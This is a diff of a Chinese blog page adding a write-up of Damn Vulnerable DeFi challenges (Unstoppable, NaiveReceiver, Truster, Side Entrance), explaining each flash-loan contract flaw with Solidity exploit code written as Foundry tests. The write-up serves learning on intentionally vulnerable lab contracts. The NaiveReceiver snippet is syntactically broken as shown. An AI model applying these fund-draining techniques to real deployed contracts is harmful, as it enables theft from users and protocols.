@@ -28,7 +28,7 @@
 <meta property="og:description" content="继续刷题">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-08-26T12:37:00.000Z">
-<meta property="article:modified_time" content="2024-08-26T13:04:52.829Z">
+<meta property="article:modified_time" content="2024-08-29T03:36:55.574Z">
 <meta property="article:author" content="HeyGap">
 <meta property="article:tag" content="Blockchain">
 <meta property="article:tag" content="Smart Contract">
@@ -211,10 +211,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-08-26 20:08:00 / 修改时间：21:08:82" itemprop="dateCreated datePublished" datetime="2024-08-26T20:37:00+08:00">2024-08-26</time>
+              <time title="创建时间：2024-08-26 20:08:00" itemprop="dateCreated datePublished" datetime="2024-08-26T20:37:00+08:00">2024-08-26</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-29 11:08:57" itemprop="dateModified" datetime="2024-08-29T11:36:55+08:00">2024-08-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -260,6 +266,9 @@ target="_blank" rel="noopener" href="https://github.com/theredguild/damn-vulnera
 emit
 log，方便我们调试。而我们的攻击poc就要写在上面这个.t.sol文件的test_<题目名称>()这个函数中。</p>
 <h1 id="unstoppable">[1] Unstoppable</h1>
+<blockquote>
+<p>漏洞类型：revert条件设置不当</p>
+</blockquote>
 <p>本题我们的目标是攻击闪电贷合约，让这个闪电贷在任何时候都无法工作。</p>
 <p>闪电贷（Flash
 Loan）是一种无需抵押的贷款形式，广泛用于去中心化金融（DeFi）领域。它的特别之处在于，贷款的整个过程（借款、使用资金、还款）必须在同一笔交易中完成。如果在交易结束时贷款没有被偿还，整个交易将被回滚，确保贷款人不会承担任何风险。</p>
@@ -286,6 +295,62 @@ ether），supply 是闪电贷合约能供给的数目上限，也就是一开�
 了,此时就永远关停这个闪电贷了。</p>
 <p>exp 如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) == vault.totalAssets(),&quot;not equal&quot;);</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(token.transfer(address(vault), 1 wei));</span><br><span class="line">    emit log_named_uint(&quot;calc result&quot;, vault.convertToShares(vault.totalSupply()));</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),&quot;equal&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我突然意识到这个闪电贷是不是只要接收到 fee 立刻就 dead 了。。</p>
+<h1 id="naivereceiver">[2] NaiveReceiver</h1>
+<blockquote>
+<p>漏洞类型：权限设置错误</p>
+</blockquote>
+<p>这道题要求我们把 receiver 里的 10 WETH 和 pool 里的 1000 WETH
+全转移到 recovery 账户中。最后 isSolved 有四条限制：</p>
+<ol type="1">
+<li><p>player 调用的交易小于等于 2 条</p></li>
+<li><p>receiver 的 weth 余额为0</p></li>
+<li><p>pool 的 weth 余额为0</p></li>
+<li><p>recovery 的 weth 余额为 1010</p></li>
+</ol>
+<p>很明显能看到 NaiveReceiverPool 合约中的 withdraw
+权限设置的不对，任何人都可以调用这个函数取款。</p>
+<p>但新版本的 solidity feature 卡了我好久...原来 0.8.0
+之后的上溢/下溢都会自动检测了..也就是说没办法直接通过withdraw直接提款。</p>
+<p>但这个合约还自己实现了 _msgSender 函数，当调用者是 trustedForwarder
+时，_msgSender 函数就会将 msg.data的 最后 20byte
+当作地址返回。也就是说，我们必须要通过 trustedForwarder 的 execute
+方法来间接调用 withdraw。</p>
+<p>除此之外，我们知道 deposits[deployer] 是有 1000WETH
+的，deposits[receiver] 也有
+10WETH，所以我们就有如下两种方法来转走这两个合约的 WETH：</p>
+<p>第一种是通过闪电贷的 fee，把 receiver 里的 10WETH 转移到 deployer
+中，然后一口气提干净。</p>
+<p>第二种是提取一次 deployer，提取一次 receiver</p>
+<p>但无论以上哪一种方法，都需要绕过上述的第一条限制：交易数小于等于 2
+条，而这就用到了 Multicall 合约里的 multicall 方法了。</p>
+<p>我们看第一种方法：调用 10 次 flashLoan，交 10 次 1WETH
+的手续费，就能把 WETH 汇总在 deployer 的 deposits 中。不过这 10
+次交易需要用 multicall
+一起执行，不然会超出第一条限制的要求。然后，我们再通过 execute 调用
+withdraw，就可以把这里面的存款全都转到 recovery
+中了。不过这里我们选择把两条交易合并作一条，也就是把 withdraw 的 abi
+编码与前10条 flashLoan 的编码合在一起。exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function test_naiveReceiver() public checkSolvedByPlayer &#123;</span><br><span class="line">    bytes[] memory callData = new bytes[](11);</span><br><span class="line">    for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes(&quot;&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    callData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));</span><br><span class="line">        bytes32(uint256(uint160(deployer))),</span><br><span class="line">    );</span><br><span class="line">    bytes memory multicallData = abi.encodeCall(Multicall.multicall, callData);</span><br><span class="line">    BasicForwarder.Request memory request = BasicForwarder.Request(&#123;</span><br><span class="line">        from: player,</span><br><span class="line">        target: address(pool),</span><br><span class="line">        value: 0,</span><br><span class="line">        gas: 1e7,</span><br><span class="line">        nonce: forwarder.nonces(player),</span><br><span class="line">        data: multicallData,</span><br><span class="line">        deadline: block.timestamp + 1 days</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes32 requestHash = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &quot;\x19\x01&quot;,</span><br><span class="line">            forwarder.domainSeparator(),</span><br><span class="line">            forwarder.getDataHash(request)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);</span><br><span class="line">    bytes memory signature = abi.encodePacked(r, s, v);</span><br><span class="line">    forwarder.execute(request, signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="truster">[3] Truster</h1>
+<p>这道题的合约代码量很小，就实现了一个闪电贷，让我们通过闪电贷的交易过程，把合约里的钱都转走。</p>
+<p>想转走代币一共有两种方法，第一种是直接让可信用户调用 transfer
+函数，第二种是让恶意用户成为可信用户后，再通过恶意用户转账。由于
+flashLoan 设置了代币数目检查，所以我们没办法在 flashLoan 的
+target.functionCall 中直接调用 transfer，但我们可以采取
+approve，让恶意合约有操控代币的权限。</p>
+<p>exp 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">contract TrusterExploiter &#123;</span><br><span class="line">    TrusterLenderPool public pool;</span><br><span class="line">    DamnValuableToken public token;</span><br><span class="line">    address recovery;</span><br><span class="line"></span><br><span class="line">    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        token = _token;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (bool) &#123;</span><br><span class="line">        require(pool.flashLoan(</span><br><span class="line">            0,</span><br><span class="line">            address(this),</span><br><span class="line">            address(token),</span><br><span class="line">            abi.encodeCall(token.approve,(address(this), 1_000_000e18))</span><br><span class="line">        ));</span><br><span class="line">        token.transferFrom(address(pool), address(this), 1_000_000e18);</span><br><span class="line">        token.transfer(recovery, 1_000_000e18);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_truster() public checkSolvedByPlayer &#123;</span><br><span class="line">        TrusterExploiter exploiter = new TrusterExploiter(pool, token, recovery);</span><br><span class="line">        require(exploiter.attack());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="side-entrance">[4] Side Entrance</h1>
+<p>这题跟上一题很相似，但是上一题用的是代币，这一题就完完全全用的 ether
+了。不过我们可以在
+<code>IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</code>
+里将贷款来的钱再用 deposit 存入 SideEntranceLenderPool
+合约中，这样不仅不会影响 RepayFailed，还可以让
+balances[IFlashLoanEtherReceiver] = 1000，之后我们 withdraw
+即可成功提款，然后转账给 recovery 就好了。exp 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract IFlashLoanEtherReceiver &#123;</span><br><span class="line">    address player;</span><br><span class="line">    address recovery;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(SideEntranceLenderPool _pool, address _player, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        player = _player;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(recovery).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_sideEntrance() public checkSolvedByPlayer &#123;</span><br><span class="line">        IFlashLoanEtherReceiver receiver = new IFlashLoanEtherReceiver(pool, player, recovery);</span><br><span class="line">        receiver.callFlashLoan(1000e18);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="the-rewarder">[5] The Rewarder</h1>
 
     </div>
 
@@ -335,7 +400,10 @@ ether），supply 是闪电贷合约能供给的数目上限，也就是一开�
     <a href="/2024/08/20/blockchain%20-%202024%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/" rel="prev" title="blockchain - 2024合约漏洞类型汇总（更新中）">
       <i class="fa fa-chevron-left"></i> blockchain - 2024合约漏洞类型汇总（更新中）
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/08/27/CSBasics%20-%20NJU_Program_Analysis_Node/" rel="next" title="CSBasics - NJU_Program_Analysis_Node">
+      CSBasics - NJU_Program_Analysis_Node <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -394,7 +462,7 @@ ether），supply 是闪电贷合约能供给的数目上限，也就是一开�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">[0] 环境设置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unstoppable"><span class="nav-number">2.</span> <span class="nav-text">[1] Unstoppable</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">[0] 环境设置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unstoppable"><span class="nav-number">2.</span> <span class="nav-text">[1] Unstoppable</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#naivereceiver"><span class="nav-number">3.</span> <span class="nav-text">[2] NaiveReceiver</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#truster"><span class="nav-number">4.</span> <span class="nav-text">[3] Truster</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#side-entrance"><span class="nav-number">5.</span> <span class="nav-text">[4] Side Entrance</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#the-rewarder"><span class="nav-number">6.</span> <span class="nav-text">[5] The Rewarder</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -410,7 +478,7 @@ ether），supply 是闪电贷合约能供给的数目上限，也就是一开�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -421,7 +489,7 @@ ether），supply 是闪电贷合约能供给的数目上限，也就是一开�
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
